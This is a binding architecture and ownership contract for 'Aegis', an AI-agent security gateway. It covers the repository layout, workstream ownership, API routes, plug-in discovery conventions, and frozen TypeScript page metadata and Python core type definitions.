# Aegis — CONTRACTS (binding)

> **Status:** v1.0 · 2026-10-03 · owner: lead architect / `scaffold`.
> This is the single source of truth for the 20 planners and ~25 implementers who edit **one shared working tree** in parallel.
> Precedence: `BRIEF.md` decides product intent; **this file decides structure, names, shapes and ownership**; research files are background.
> Only `scaffold` edits this file. If you need a change, put it under "Requests" in your report (§7.9) and use the documented escape hatches meanwhile.

**Glossary.** *Workstream* = one of the 20 owners in §1.2. *Frozen* = materialized verbatim from this document by `scaffold` before implementers start; nobody else edits it. The five frozen files are the fenced code blocks directly under the headings marked **(FROZEN)**: `web/src/lib/page.ts` (§2.2), `src/aegis/core/types.py` (§3.1), `src/aegis/core/protocols.py` (§3.2), `src/aegis/core/policy_schema.py` (§4.2), `web/src/api/types.ts` (§5.5); they were type-checked (pydantic 2 / Python 3.13, `tsc --strict`) when this contract was written. *Staging* = `staging/` and `models/`, pre-work produced before this contract; read-only inputs to port from (§1.4). *rt* = the runtime service container (§3.3). *Interaction* = one normalized hop the pipeline evaluates (a request or a response). *Surface* = where in the system the hop happened (`model.request`, `mcp.call`, …). *Decision* = one control's verdict; *Verdict* = the combined result of one pipeline evaluation.

Contents: §1 tree & ownership · §2 plug-in discovery · §3 core types, protocols, pipeline semantics, vocabularies · §4 policy, org seed, pricing, feed, control catalog · §5 HTTP API + frontend contract · §6 storage, events, metrics, env, ports · §7 parallel-work rules · §8 headline flows (acceptance).

---

## 1. Repository tree and ownership

### 1.1 Target tree

```
aegis/
├── pyproject.toml  uv.lock  .python-version(3.13)  Makefile  .gitignore  .env.example   [scaffold]
├── README.md                                                            [demo-mocks-docs]
├── config/
│   ├── policy.yaml                live policy; judges edit it; hot reloaded  [policy-engine]
│   ├── policy.golden.yaml         factory default; hermetic tests copy it    [policy-engine]
│   ├── profiles/{permissive,balanced,strict,paranoid}.yaml                   [policy-engine]
│   ├── schema/policy.schema.json  generated from PolicyDoc (Monaco)          [policy-engine]
│   ├── snippets/<workstream>.yaml proposed policy entries for your controls  [that workstream]
│   ├── org.seed.yaml              org, teams, members, roles, agents         [org-rbac]
│   ├── pricing.yaml               model / tool prices                        [budgets-ledger]
│   └── feeds/                     feed_pubkey.b64, seed_bundle.json(+.sig)   [threat-feed]
├── src/aegis/
│   ├── __init__.py                __version__ only                           [scaffold]
│   ├── __main__.py  app.py  settings.py  log.py                              [core-gateway]
│   ├── core/__init__.py  core/types.py  core/protocols.py  core/policy_schema.py   [scaffold · FROZEN]
│   ├── core/{runtime,pipeline,bus,db,deps,discovery,nulls,paths,sessions,errors}.py [core-gateway]
│   ├── proxy/{adapters/*,router,upstream,streaming}.py                       [core-gateway]
│   ├── api/__init__.py  api/routes/__init__.py   (empty packages)            [scaffold]
│   ├── api/routes/<name>.py       one or more files per owner, see §1.3      [per §1.3]
│   ├── controls/__init__.py       (empty package)                            [scaffold]
│   ├── controls/governance/       GOV-01, GOV-02                             [org-rbac]
│   ├── controls/actions/          GOV-03, GOV-04, ACT-01…04, EXE-01…03       [action-guards]
│   ├── controls/config/           GOV-05                                     [approvals-engine]
│   ├── controls/dlp/              DLP-01, DLP-02, DLP-05, DLP-07, DLP-08     [redaction-engine]
│   ├── controls/egress/           DLP-03, DLP-04, DLP-06                     [metadata-egress]
│   ├── controls/injection/        INJ-01, INJ-02, INJ-04, INJ-05             [injection-defense]
│   ├── controls/semantic/         INJ-03, CUS-01                             [semantic-models]
│   ├── controls/budget/           BUD-01, BUD-02, EXE-04                     [budgets-ledger]
│   ├── controls/mcp/              MCP-01 … MCP-04                            [mcp-proxy]
│   ├── controls/signatures/       SIG-01, SIG-02, SIG-03                     [threat-feed]
│   ├── policy/                    store, loader, validate, diff, profiles, selftest, watcher, data/frameworks.yaml [policy-engine]
│   ├── org/                       service, identity, seed                    [org-rbac]
│   ├── approvals/                 service, routing, fingerprint, expiry      [approvals-engine]
│   ├── actions/                   classify, shell, fs, net (SSRF), taint     [action-guards]
│   ├── redaction/                 engine, vault, validators, ner, detectors/*, data/ [redaction-engine]
│   ├── egress/                    metadata, encoded, exfil, forwarder        [metadata-egress]
│   ├── injection/                 normalize, signatures, canary, data/       [injection-defense]
│   ├── semantic/                  engine, onnx, ollama, embeddings, heuristic, judge [semantic-models]
│   ├── budgets/                   ledger, pricing, tokens, loops, killswitch [budgets-ledger]
│   ├── mcp/                       proxy, jsonrpc, pins, inventory, stdio     [mcp-proxy]
│   ├── integrations/__init__.py   (empty package)                            [scaffold]
│   ├── integrations/claude_code/  hook-event mapping                         [claude-code-integration]
│   ├── feed/                      manager, verify, compile, schema, matchers/* [threat-feed]
│   ├── audit/                     log (hash chain), index, export, verify    [audit-metrics]
│   ├── metrics/                   prom, stats, perf, timing                  [audit-metrics]
│   └── sdk/                       tiny client for demo agents & tests        [demo-mocks-docs]
├── feed_service/                  external threat-intel service (:8790)      [threat-feed]
│   └── __init__.py __main__.py app.py signing.py build.py signatures/*.yaml lists/ ui/ state/(gitignored)
├── mocks/
│   ├── __init__.py                                                          [demo-mocks-docs]
│   ├── mock_llm/  (:8791)  exfil_sink/ (:8793)  mock_saas/ (:8794)          [demo-mocks-docs]
│   └── mock_mcp/  (:8792)                                                   [mcp-proxy]
├── demo/
│   ├── claude/   settings.json, mcp.json, project/ (demo workspace), README.md   [claude-code-integration]
│   ├── agents/   scripted agents (trading-copilot, research-agent, chaos-agent runaway, …) [demo-mocks-docs]
│   ├── scenarios/ one script per demo scene                                      [demo-mocks-docs]
│   └── preflight.py                                                              [demo-mocks-docs]
├── scripts/
│   ├── run_stack.py      start gateway + feed + mocks with prefixed logs    [demo-mocks-docs]
│   ├── aegis-hook        Claude Code command-hook client (bash, fail-closed)[claude-code-integration]
│   ├── fetch_models.sh   ONNX + Ollama + spaCy model fetch                  [semantic-models]
│   ├── bench.py          overhead / rps benchmark                           [redteam-eval-perf]
│   └── export_schema.py  PolicyDoc -> config/schema/policy.schema.json      [policy-engine]
├── web/                   see §1.2 (frontend split)
├── tests/
│   ├── __init__.py conftest.py lib/ cases/ e2e/ fixtures/ test_*.py (top level)   [test-suite]
│   ├── unit/<workstream_snake>/   unit tests of that workstream                    [that workstream]
│   └── eval/ bench/ corpora/ redteam/                                              [redteam-eval-perf]
├── docs/
│   ├── BRIEF.md  CONTRACTS.md                                               [scaffold]
│   ├── plan/<workstream>.md                                                 [that workstream]
│   └── everything else (architecture.md, policy-reference.md, demo-script.md, api.md, submission/) [demo-mocks-docs]
├── models/    downloaded ONNX model weights + MANIFEST.sha256 (gitignored, ~0.8 GB)      [semantic-models]
├── staging/   pre-work inputs (read-only; port, don't import) — §1.4                      [scaffold]
├── data/      runtime state (gitignored), layout §6.2
└── reports/   generated test/bench/eval output (gitignored except committed samples) — written by test-suite & redteam-eval-perf tools
```

Reserved, **do not create**: `src/aegis/a2a/`, `/a2a/*` routes, port 8795 (A2A is a stretch goal; scaffold assigns it later if time allows).

### 1.2 Ownership map (disjoint; every path has exactly one owner)

`<ws_snake>` = workstream name with `-` → `_` (e.g. `tests/unit/core_gateway/`). Every workstream additionally owns `docs/plan/<workstream>.md`, `config/snippets/<workstream>.yaml` and `tests/unit/<ws_snake>/`.

| Workstream | Owns (paths) |
|---|---|
| **scaffold** (lead/orchestrator, not an implementer) | `pyproject.toml`, `uv.lock`, `.python-version`, `Makefile`, `.gitignore`, `.env.example`, `docs/BRIEF.md`, `docs/CONTRACTS.md`, `src/aegis/__init__.py`, `src/aegis/core/__init__.py`, **FROZEN** `src/aegis/core/types.py`, `src/aegis/core/protocols.py`, `src/aegis/core/policy_schema.py`, empty packages `src/aegis/api/__init__.py`, `src/aegis/api/routes/__init__.py`, `src/aegis/controls/__init__.py`, `src/aegis/integrations/__init__.py`; web manifests `web/package.json`, `web/package-lock.json`, `web/vite.config.ts`, `web/tsconfig*.json`, `web/index.html`, `web/components.json`, `web/eslint.config.js`; **FROZEN** `web/src/api/types.ts`, `web/src/lib/page.ts`; `staging/**` (read-only for everyone) |
| **core-gateway** | `src/aegis/__main__.py`, `app.py`, `settings.py`, `log.py`; `src/aegis/core/` except frozen/scaffold files; `src/aegis/proxy/**`; routes `health.py`, `proxy_anthropic.py`, `proxy_openai.py`, `proxy_ollama.py`, `guard.py`, `events.py`, `playground.py`, `ui.py` |
| **policy-engine** | `src/aegis/policy/**`; `config/policy.yaml`, `config/policy.golden.yaml`, `config/profiles/**`, `config/schema/**`; `scripts/export_schema.py`; route `policy.py` |
| **redaction-engine** | `src/aegis/redaction/**`; `src/aegis/controls/dlp/**`; route `redaction.py` |
| **metadata-egress** | `src/aegis/egress/**`; `src/aegis/controls/egress/**`; route `egress.py` |
| **injection-defense** | `src/aegis/injection/**`; `src/aegis/controls/injection/**` |
| **semantic-models** | `src/aegis/semantic/**`; `src/aegis/controls/semantic/**`; `scripts/fetch_models.sh`; `models/**` (weights; others read only); route `semantic.py` |
| **budgets-ledger** | `src/aegis/budgets/**`; `src/aegis/controls/budget/**`; `config/pricing.yaml`; route `budgets.py` |
| **org-rbac** | `src/aegis/org/**`; `src/aegis/controls/governance/**`; `config/org.seed.yaml`; route `org.py` |
| **approvals-engine** | `src/aegis/approvals/**`; `src/aegis/controls/config/**`; route `approvals.py` |
| **action-guards** | `src/aegis/actions/**`; `src/aegis/controls/actions/**` |
| **mcp-proxy** | `src/aegis/mcp/**`; `src/aegis/controls/mcp/**`; `mocks/mock_mcp/**`; routes `mcp.py`, `mcp_admin.py` |
| **claude-code-integration** | `src/aegis/integrations/claude_code/**`; `scripts/aegis-hook`; `demo/claude/**`; route `hooks_claude_code.py` |
| **threat-feed** | `src/aegis/feed/**`; `src/aegis/controls/signatures/**`; `feed_service/**`; `config/feeds/**`; route `feed.py` |
| **audit-metrics** | `src/aegis/audit/**`; `src/aegis/metrics/**`; routes `audit.py`, `decisions.py`, `stats.py`, `metrics.py` |
| **dashboard-shell** | `web/public/**`; `web/src/main.tsx`, `App.tsx`, `router.tsx`, `vite-env.d.ts`; `web/src/styles/**`; `web/src/lib/**` (except frozen `page.ts`); `web/src/api/client.ts`, `sse.ts`, `hooks.ts`; `web/src/components/{ui,shell,charts}/**`; `web/src/mocks/shell/**`; `web/src/pages/overview.page.tsx`, `web/src/pages/system/**` |
| **dashboard-security** | `web/src/components/security/**`; `web/src/mocks/security/**`; `web/src/pages/security/**` |
| **dashboard-governance** | `web/src/components/governance/**`; `web/src/mocks/governance/**`; `web/src/pages/governance/**` |
| **test-suite** | `tests/__init__.py`, `tests/conftest.py`, `tests/lib/**`, `tests/cases/**`, `tests/e2e/**`, `tests/fixtures/**`, top-level `tests/test_*.py` |
| **redteam-eval-perf** | `tests/eval/**`, `tests/bench/**`, `tests/corpora/**`, `tests/redteam/**`; `scripts/bench.py` |
| **demo-mocks-docs** | `README.md`; `docs/**` except `BRIEF.md`, `CONTRACTS.md`, `plan/`; `mocks/__init__.py`, `mocks/mock_llm/**`, `mocks/exfil_sink/**`, `mocks/mock_saas/**`; `demo/agents/**`, `demo/scenarios/**`, `demo/preflight.py`; `scripts/run_stack.py`; `src/aegis/sdk/**` |

Generated, not owned (never hand-edit, gitignored): `data/**`, `reports/**`, `web/dist/**`, `web/node_modules/**`, `feed_service/state/**`, `.venv/**`.

### 1.3 Route files (`src/aegis/api/routes/`)

| File | Owner | Paths served |
|---|---|---|
| `health.py` | core-gateway | `GET /healthz`, `HEAD|GET /api/hello` (Claude Code probe) |
| `proxy_anthropic.py` | core-gateway | `POST /v1/messages`, `POST /v1/messages/count_tokens` |
| `proxy_openai.py` | core-gateway | `POST /v1/chat/completions`, `POST /openai/v1/chat/completions`, `GET /v1/models` |
| `proxy_ollama.py` | core-gateway | `ANY /ollama/{path:path}` |
| `guard.py` | core-gateway | `POST /v1/guard`, `POST /v1/guard/complete` |
| `events.py` | core-gateway | `GET /api/events` (SSE) |
| `playground.py` | core-gateway | `POST /api/playground` |
| `ui.py` (ORDER 900) | core-gateway | `GET /` → 302 `/ui/`, `GET /ui/{path:path}` (static `web/dist`, SPA fallback) |
| `egress.py` | metadata-egress | `POST /egress` |
| `mcp.py` | mcp-proxy | `POST|GET|DELETE /mcp/{server}`, `POST /mcp/{server}/_stdio` |
| `mcp_admin.py` | mcp-proxy | `/api/mcp/*` |
| `hooks_claude_code.py` | claude-code-integration | `POST /v1/hooks/claude-code` |
| `policy.py` | policy-engine | `/api/policy*`, `/api/controls`, `/api/coverage` |
| `budgets.py` | budgets-ledger | `/api/budgets*`, `/api/killswitch` |
| `org.py` | org-rbac | `/api/org`, `/api/members*`, `/api/agents*`, `/api/whoami` |
| `approvals.py` | approvals-engine | `/api/approvals*` |
| `feed.py` | threat-feed | `/api/feed/*` |
| `audit.py` | audit-metrics | `/api/audit*` |
| `decisions.py` | audit-metrics | `/api/decisions*` |
| `stats.py` | audit-metrics | `/api/stats`, `/api/perf` |
| `metrics.py` | audit-metrics | `GET /metrics` |
| `semantic.py` | semantic-models | `GET /api/semantic/status` |
| `redaction.py` | redaction-engine | `GET /api/redaction/entities` |

### 1.4 Staging inputs (read-only; port, don't import)

`staging/` and `models/` were produced by pre-work agents before this contract. `staging/` is **read-only reference material**: copy/port what you need into your own paths and adapt it to this contract; never import from `staging/` at runtime and never edit it. Where staging disagrees with this contract, **the contract wins** (translation table below).

| Staged input | Use it for | Ported by |
|---|---|---|
| `staging/seed/policy.yaml` | content of `config/policy.yaml`: comments, profile tables, control descriptions, `examples` → `tests` | policy-engine (each control owner reads its own entry for knobs and examples) |
| `staging/seed/org.seed.yaml` | **is** the seed format and the demo cast (§4.5); copied to `config/org.seed.yaml`; its `budgets:` amounts are ported into policy `budgets.limits`; `resources:` served by `rt.org.resources()` | org-rbac (budget amounts → policy-engine) |
| `staging/pii/validators.py`, `staging/pii/normalize.py` | checksum validators (PESEL, NIP, REGON, IBAN/NRB, Luhn + card brands, ID card, passport) and the offset-preserving anti-evasion normalizer | redaction-engine (injection-defense may copy normalizer ideas into `aegis.injection.normalize`) |
| `staging/models/*.py`, `Modelfile.*`, `download_models.sh`, `bench_results/` | ONNX classifier / embedder / Ollama guard + judge clients, fetch script, measured latencies | semantic-models (`ner_pii.py` → redaction-engine for DLP-07) |
| `staging/feed-seed/*` | bundle JSON schema, feed library, validator | threat-feed |
| `staging/spikes/claude-code/` (**read `FINDINGS.md`**) | verified Claude Code gateway passthrough, hook fail-open/closed behaviour, budget-stop status codes, settings files | claude-code-integration (passthrough facts → core-gateway) |
| `staging/spikes/mcp/` | MCP proxy, stdio wrapper, pins and fake-server prototype | mcp-proxy |
| `staging/spikes/streaming/` | SSE holdback scanner, JSON lexer, streaming placeholders | core-gateway (placeholders → redaction-engine) |
| `staging/corpora/` | licence-checked public + handwritten corpora, obfuscation transforms | redteam-eval-perf (handwritten benign/attack sets also → test-suite) |
| `staging/submission/` | demo runbook, 60 s video script, pitch deck, architecture diagram, HackTribe draft | demo-mocks-docs |
| `staging/design/prototype/` | dashboard visual language (tokens, CSS, prototype JS) | dashboard-shell ports tokens/CSS; all dashboard workstreams use it as the visual reference |
| `models/` (repo root) | ONNX weights: `pg2-22m`, `pi-horizon-small`, `minilm-l12-multi`, `eu-pii-ner`, `qwen3guard` (tokenizer); Ollama tags `aegis-guard` (Qwen3Guard-Gen-0.6B) and `aegis-judge` (Qwen3.5-0.8B) already exist locally | semantic-models owns; redaction-engine reads `models/eu-pii-ner` |

**Translation table (staged vocabulary → contract):**

| Staged | Contract |
|---|---|
| surfaces `llm.request` / `llm.response` / `final` | `model.request` / `model.response` / `model.response` |
| `tool.call`, `hook.pre_tool_use`, `action.request` | `tool.input` (built-in tools) or `mcp.call` (MCP); an "action request" is a tool call with `action_type` set |
| `tool.result` | `tool.output` / `mcp.result` |
| `tool.list`, `mcp.auth` | `mcp.list`, `mcp.init` |
| `http.egress` | `egress.request` |
| `admin.api`, `artifact.fetch`, `artifact.bytes` | `model.admin`, `model.admin`, `artifact.file` |
| `memory.io` | not supported (drop) |
| tiers `T0` / `T1` / `T2` | `local` / `remote` / `third_party` |
| `*_pct` thresholds (0–100) | `threshold` (0–1); only `adherence_pct` stays a percentage |
| control `title`, `type`, `config`, `thresholds`, `status` | `name`, Python `kind` ClassVar, `params` (thresholds go into `params` as well), docs only |
| `examples.should_block` / `should_allow` | `tests` entries (`expect` from the example; default `block` / `allow`) |
| `by_profile:` maps | `config/profiles/<profile>.yaml` |
| actions `tokenize`, `mask`, `generalize`, `quarantine`, `strip_tool`, `clamp`, `downgrade`, `rehydrate`, `modify` | `redact` (+ params / mutations); `throttle` → `block` + 429; `kill` → kill switch |
| `budgets.cost_table` / `ladder` / `limit_overrides` / org-seed budget amounts | `config/pricing.yaml` / `budgets.defaults` / `budgets.limits` |
| `approvals.yaml` (separate file) | `approvals:` section of `policy.yaml` |
| model ids `anthropic/claude-sonnet-5-5`, `ollama/qwen3.5:0.8b`, `mock/echo-llm` | wire model names and globs: `claude-sonnet-*`, `aegis-judge` / `qwen*`, `mock-echo` |
| signature ids `AICL-TI-0xx` | `AEGIS-TI-0xx` |
| key prefix `aegis_demo_` | accepted (any key starting with `aegis_`) |

---

## 2. Plug-in auto-discovery (nobody edits a shared registry)

### 2.1 Backend

All discovery lives in `aegis.core.discovery` (core-gateway). Every discovered module is imported inside `try/except Exception`; a failure is logged at ERROR, listed in `/healthz` → `components.plugins = "degraded"`, and **the gateway still boots**. Modules whose filename starts with `_` are skipped. Discovered modules must have **no import-time side effects** (no network, no model loading, no DB writes, no threads).

| What | Where | Convention | Ordering / conflicts |
|---|---|---|---|
| FastAPI routers | `src/aegis/api/routes/*.py` | module-level `router: fastapi.APIRouter` with **absolute paths** (no prefix added by core). Optional `ORDER: int = 100`, `async def on_startup(rt)`, `async def on_shutdown(rt)` | included sorted by `(ORDER, filename)`; `on_startup` runs after all services started, same order |
| Controls | `src/aegis/controls/**` (recursive `pkgutil.walk_packages`) | module-level `CONTROLS: list[Control]` (instances) | duplicate `id` → ERROR, first by module path wins. Control without a policy entry = inactive ("implemented, not configured"); policy entry without implementation = skipped ("configured, not implemented") |
| Redaction detectors | `src/aegis/redaction/detectors/*.py` | module-level `DETECTORS: list[Detector]` | loaded by redaction-engine's engine; exposed via `rt.redactor.detectors()` |
| Wire adapters | `src/aegis/proxy/adapters/*.py` | module-level `ADAPTERS: list[ProviderAdapter]` | one per `wire` |
| Feed matchers | `src/aegis/feed/matchers/*.py` | threat-feed internal (`MATCHERS: dict[str, type]`) | — |
| Services | fixed table §3.3 | each module exposes `def create(rt) -> Service` | Null fallback from `aegis.core.nulls` if import/create fails |
| Approval executors | any `on_startup(rt)` or service `start()` | `rt.approvals.register_executor(kind, async fn)` | last registration wins (one per kind) |

Example (any workstream):

```python
# src/aegis/controls/egress/dlp03_metadata.py
from aegis.core.protocols import BaseControl
from aegis.core.types import AppliesTo

class MetadataStrip(BaseControl):
    id, family, name, kind = "DLP-03", "DLP", "Metadata stripping", "deterministic"
    applies_to = AppliesTo(surfaces={"model.request", "egress.request", "mcp.call"})
    owasp = ["LLM02:2026", "MCP10:2025"]
    async def evaluate(self, ctx, interaction, cfg): ...

CONTROLS = [MetadataStrip()]
```

### 2.2 Frontend pages — `web/src/lib/page.ts` (FROZEN)

Shell router: `import.meta.glob('./pages/**/*.page.tsx', { eager: true })`. Each `*.page.tsx` must `export default` a component and `export const meta: PageMeta`. Other files in `pages/**` (no `.page.tsx` suffix) are page-local helpers and are ignored by discovery. The sidebar groups by `section` (Overview → Security → Governance → System), sorts by `order`, hides `nav:false`, and shows pages above the current view-as role as locked (not hidden) so the role switch is visible in the demo. Unknown icon names fall back to `Circle`.

```ts
// Dashboard page plug-in contract. FROZEN: materialized verbatim from docs/CONTRACTS.md section 2.2.
// Every file matching web/src/pages/**/*.page.tsx must `export default` a React component
// and `export const meta: PageMeta`. The shell discovers them with import.meta.glob.

export type ViewRole = 'owner' | 'admin' | 'member';
export type NavSection = 'Overview' | 'Security' | 'Governance' | 'System';

export interface PageMeta {
  /** Route path under the /ui basename, e.g. "/security/live" or "/security/decisions/:id". */
  path: string;
  title: string;
  /** lucide-react icon name in PascalCase, e.g. "ShieldAlert". */
  icon: string;
  section: NavSection;
  /** Sort order inside the section (ascending). Default 100. */
  order?: number;
  /** Minimum view-as role to see the page. Default "member". */
  minRole?: ViewRole;
  /** Show in the sidebar. Default true; set false for detail routes with params. */
  nav?: boolean;
  /** Live counter badge shown next to the nav item. */
  badge?: 'approvals' | 'live' | 'feed' | null;
  /** One-line description for the command palette. */
  description?: string;
  /** Keyboard shortcut hint for the command palette, e.g. "g a". */
  shortcut?: string;
}

export const VIEW_ROLE_RANK: Record<ViewRole, number> = { member: 1, admin: 2, owner: 3 };
```

Planned pages (paths are binding so links between pages work):

| Page file | Owner | `meta.path` | Section / order | minRole |
|---|---|---|---|---|
| `pages/overview.page.tsx` | dashboard-shell | `/` | Overview / 10 | member |
| `pages/system/perf.page.tsx` | dashboard-shell | `/system/perf` | System / 10 | member |
| `pages/system/health.page.tsx` | dashboard-shell | `/system/health` | System / 20 | member |
| `pages/security/live.page.tsx` | dashboard-security | `/security/live` (badge `live`) | Security / 10 | member |
| `pages/security/decision.page.tsx` | dashboard-security | `/security/decisions/:id` (nav false) | — | member |
| `pages/security/playground.page.tsx` | dashboard-security | `/security/playground` | Security / 20 | member |
| `pages/security/threats.page.tsx` | dashboard-security | `/security/threats` (badge `feed`) | Security / 30 | member |
| `pages/security/mcp.page.tsx` | dashboard-security | `/security/mcp` | Security / 40 | member |
| `pages/security/coverage.page.tsx` | dashboard-security | `/security/coverage` | Security / 50 | member |
| `pages/security/audit.page.tsx` | dashboard-security | `/security/audit` | Security / 60 | member (export needs admin) |
| `pages/governance/approvals.page.tsx` | dashboard-governance | `/governance/approvals` (badge `approvals`; `?id=apr_…` opens one) | Governance / 10 | member |
| `pages/governance/budgets.page.tsx` | dashboard-governance | `/governance/budgets` | Governance / 20 | member |
| `pages/governance/org.page.tsx` | dashboard-governance | `/governance/org` | Governance / 30 | member |
| `pages/governance/rules.page.tsx` | dashboard-governance | `/governance/rules` ("who can approve what") | Governance / 35 | member |
| `pages/governance/policy.page.tsx` | dashboard-governance | `/governance/policy` (tabs: editor, diff, history) | Governance / 40 | member (apply may route to approval) |

### 2.3 Policy entries for your controls

`config/policy.yaml` is one file owned by policy-engine. policy-engine writes the initial file from the catalog in §4.4 (every control ID, defaults as listed). Each control owner writes **`config/snippets/<workstream>.yaml`** containing the exact YAML entries (controls, `actions:`, approval rules, budgets, MCP servers…) their code expects, plus inline `tests:`; policy-engine merges snippets during integration. Controls must **work with defaults** when `params` keys are missing (validate `cfg.params` with your own pydantic model with defaults; unknown params → warning, not crash).

---

## 3. Core types, protocols and pipeline semantics

### 3.1 `src/aegis/core/types.py` (FROZEN)

```python
"""Aegis core types. FROZEN: materialized verbatim from docs/CONTRACTS.md section 3.1.

Do not edit. Need a field? Use the `meta` / `labels` / `data` escape hatches and request
the change in your report.
"""

from __future__ import annotations

import os
import time
from datetime import datetime, timezone
from typing import Any, Literal

from pydantic import BaseModel, ConfigDict, Field

# ---------------------------------------------------------------- enums (Literal aliases)
Action = Literal["allow", "log", "redact", "require_approval", "block"]
ACTION_PRECEDENCE: dict[str, int] = {
    "allow": 0, "log": 1, "redact": 2, "require_approval": 3, "block": 4,
}
Kind = Literal["model_call", "tool_call", "mcp", "egress", "a2a", "config_change"]
Direction = Literal["in", "out"]  # out = toward the destination (request/args); in = coming back
DestClass = Literal["local", "remote", "third_party"]
Role = Literal["owner", "admin", "member", "agent"]
ROLE_RANK: dict[str, int] = {"agent": 0, "member": 1, "admin": 2, "owner": 3}
Severity = Literal["info", "low", "medium", "high", "critical"]
DataClass = Literal["PUBLIC", "INTERNAL", "CONFIDENTIAL", "RESTRICTED", "SECRET"]
Mode = Literal["enforce", "monitor", "off"]
FailMode = Literal["closed", "open", "deterministic_only"]
ControlKind = Literal["deterministic", "semantic", "hybrid", "stateful"]
Surface = Literal[
    "prompt.user",      # user prompt entering an agent (Claude Code UserPromptSubmit, playground)
    "model.request",    # agent -> model request body
    "model.response",   # model -> agent response
    "model.admin",      # model management (Ollama /api/pull|create|push|delete|copy)
    "tool.input",       # agent -> tool call arguments (PreToolUse, /v1/guard)
    "tool.output",      # tool -> agent result (PostToolUse)
    "artifact.file",    # model / package artifact bytes (SIG-02)
    "mcp.init",         # MCP initialize / server launch command
    "mcp.list",         # MCP tools/list (and prompts/resources list) result
    "mcp.call",         # MCP tools/call request
    "mcp.result",       # MCP tools/call result
    "egress.request",   # third-party HTTP request
    "egress.response",  # third-party HTTP response
    "a2a.message",      # agent -> peer agent
    "a2a.result",       # peer agent -> agent
    "config.change",    # policy / config change proposal
]
Source = Literal[
    "proxy", "mcp", "hook", "guard", "egress", "playground", "dashboard", "selftest", "test",
]
SegmentRole = Literal[
    "system", "user", "assistant", "tool_args", "tool_result", "tool_description",
    "document", "header", "url", "other",
]
ApproverLevel = Literal["auto", "self", "admin", "owner", "deny"]
APPROVER_RANK: dict[str, int] = {"auto": 0, "self": 1, "admin": 2, "owner": 3, "deny": 99}
ApprovalKind = Literal["action", "config_change", "budget_raise", "mcp_pin"]
ApprovalStatus = Literal["pending", "approved", "denied", "expired", "cancelled"]
BudgetDimension = Literal["usd", "tokens", "compute_s", "requests", "tool_calls", "spend_usd"]
BudgetWindow = Literal["hour", "day", "week", "month", "session", "total"]
BudgetState = Literal["ok", "soft", "hard", "killed"]
AuditEventType = Literal[
    "decision",
    "approval.created", "approval.decided", "approval.expired", "approval.executed",
    "policy.applied", "policy.rejected", "policy.rollback",
    "feed.updated", "feed.rejected",
    "budget.threshold", "budget.exceeded", "killswitch.toggled",
    "org.changed", "mcp.tool_changed", "system",
]


def utcnow() -> datetime:
    return datetime.now(timezone.utc)


def new_id(prefix: str) -> str:
    """Time-sortable id: '<prefix>_' + 12 hex chars of epoch-ms + 14 random hex chars.
    Prefixes: req dec int apr evt res ses (see CONTRACTS section 3.4)."""
    return f"{prefix}_{int(time.time() * 1000):012x}{os.urandom(7).hex()}"


# ---------------------------------------------------------------- identity & org
class Identity(BaseModel):
    """Who is acting. For agents: agent_id is the service identity, member_id its owning human."""

    org_id: str = "default"
    team_id: str | None = None
    member_id: str | None = None
    agent_id: str | None = None
    role: Role = "agent"
    display_name: str | None = None
    authenticated: bool = False

    @property
    def principal(self) -> str:
        if self.agent_id:
            return f"agent:{self.agent_id}"
        return f"member:{self.member_id or 'anonymous'}"


class Org(BaseModel):
    id: str
    name: str


class Team(BaseModel):
    id: str
    org_id: str
    name: str
    description: str | None = None
    color: str | None = None
    meta: dict[str, Any] = Field(default_factory=dict)


class Member(BaseModel):
    id: str
    org_id: str
    team_id: str | None = None
    name: str
    email: str | None = None
    role: Literal["owner", "admin", "member"] = "member"
    title: str | None = None
    avatar_url: str | None = None
    active: bool = True
    created_at: datetime = Field(default_factory=utcnow)
    meta: dict[str, Any] = Field(default_factory=dict)  # e.g. teams, locale, avatar_color


class Agent(BaseModel):
    id: str
    org_id: str
    team_id: str | None = None
    owner_member_id: str | None = None  # the sponsoring human ("self" approver)
    name: str
    kind: Literal["claude-code", "scripted", "sdk", "mcp-client", "other"] = "other"
    description: str | None = None
    profile: str | None = None  # per-agent strictness profile override; "local" = local-only agent
    allowed_models: list[str] = Field(default_factory=lambda: ["*"])
    allowed_tools: list[str] = Field(default_factory=lambda: ["*"])
    denied_tools: list[str] = Field(default_factory=list)
    max_destination: DestClass | None = None  # most-remote destination class allowed
    active: bool = True
    created_at: datetime = Field(default_factory=utcnow)
    last_seen: datetime | None = None
    meta: dict[str, Any] = Field(default_factory=dict)  # e.g. data_grants, action_types


# ---------------------------------------------------------------- interactions
class Destination(BaseModel):
    name: str = "unknown"  # "anthropic" | "ollama" | "mcp:corpdb" | "egress:api.stripe.com" | "aegis"
    dest_class: DestClass = "remote"
    provider: str | None = None
    host: str | None = None
    url: str | None = None


class TextSegment(BaseModel):
    """One inspectable piece of text inside a payload. `path` locates it in the raw body."""

    path: str  # e.g. "messages[2].content[0].text", "params.arguments.sql", "tool_input.command"
    text: str
    role: SegmentRole = "user"
    trusted: bool = True  # False for tool results, web pages, MCP descriptions, A2A replies
    redactable: bool = True  # False for e.g. Anthropic thinking blocks


class AppliesTo(BaseModel):
    """Which interactions a control looks at. Empty set = any."""

    kinds: set[Kind] = Field(default_factory=set)
    surfaces: set[Surface] = Field(default_factory=set)
    directions: set[Direction] = Field(default_factory=set)
    destinations: set[DestClass] = Field(default_factory=set)

    def matches(self, i: Interaction) -> bool:
        return (
            (not self.kinds or i.kind in self.kinds)
            and (not self.surfaces or i.surface in self.surfaces)
            and (not self.directions or i.direction in self.directions)
            and (not self.destinations or i.destination.dest_class in self.destinations)
        )


class Interaction(BaseModel):
    """Normalized unit the pipeline evaluates (one per request or response hop)."""

    id: str = ""
    kind: Kind
    surface: Surface
    direction: Direction = "out"
    destination: Destination = Field(default_factory=Destination)
    model: str | None = None
    tool_name: str | None = None  # normalized: built-in "Bash"; MCP "<server>.<tool>"
    tool_args: dict[str, Any] | None = None
    mcp_server: str | None = None
    mcp_method: str | None = None
    http_method: str | None = None
    url: str | None = None
    headers: dict[str, str] = Field(default_factory=dict)  # outbound headers (lower-case keys)
    segments: list[TextSegment] = Field(default_factory=list)
    raw: Any = Field(default=None, exclude=True)  # original body; never serialized or logged
    action_type: str | None = None  # governed action, e.g. "spend.subscription", "db.read"
    amount_usd: float | None = None
    resource: str | None = None  # e.g. "db:customers", "api.stripe.com"
    labels: dict[str, str] = Field(default_factory=dict)  # e.g. {"env": "prod"}
    est_input_tokens: int | None = None
    max_output_tokens: int | None = None
    parent_id: str | None = None  # request interaction id when this is a response
    meta: dict[str, Any] = Field(default_factory=dict)

    def text(self) -> str:
